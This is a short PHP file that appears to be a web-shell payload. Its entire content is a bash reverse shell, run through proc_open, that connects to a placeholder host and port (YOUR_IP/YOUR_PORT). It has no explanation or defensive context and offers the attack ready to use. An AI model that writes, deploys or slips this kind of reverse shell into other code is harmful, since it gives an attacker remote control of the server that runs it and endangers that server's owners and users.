<? php
$cmd = "bash -c 'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1'";
$descriptorspec = array(
    0 => array("pipe", "r"), // stdin is a pipe that the child will read from
    1 => array("pipe", "w"), // stdout is a pipe that the child will write to
    2 => array("pipe", "w"), // stderr is a pipe that the child will write to
);

$process = proc_open($cmd, $descriptorspec, $pipes);
?>
